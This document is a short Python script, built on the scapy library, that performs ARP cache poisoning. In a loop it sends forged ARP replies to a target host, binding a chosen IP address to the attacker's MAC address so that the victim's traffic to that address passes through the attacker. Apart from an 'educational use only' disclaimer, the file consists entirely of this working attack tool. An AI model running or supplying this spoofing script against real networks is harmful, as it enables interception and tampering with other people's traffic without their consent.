#!/usr/bin/python

# This tool is for educational use only!

# Description: Assign a given IP Address to the MAC Address of the attacker on
# a victim. All traffic of the victim to the given IP address now goes throw
# the attacker
# Requirements: scapy + root privileges

import sys
import time
from scapy.all import *

def printusage():
  """ Prints usage information """
  print "Usage:   {0} <target> <spoof_IP>".format(sys.argv[0])
  print "  ---> This tool is for educational use only! <---"

# Check given arguments
if len(sys.argv) < 3:
  printusage()
  sys.exit(1)

# Collect the arguments...
iface = "eth0" # The interface to send the packet
targetIP = sys.argv[1] # The IP to send the packet to
fakeIP = sys.argv[2] # The IP that will now be assigned to the attacker

# Create a new ethernet frame
ethernetframe = Ether()
# Create a new ARP Reply
arpreply = ARP(pdst=targetIP, psrc=fakeIP, op="is-at")

# Put the ARP Reply into the ethernetframe
packet = ethernetframe / arpreply


while True:
  # Send the packet! (and then wait a moment...)
  sendp(packet, iface=iface)
  time.sleep(3)
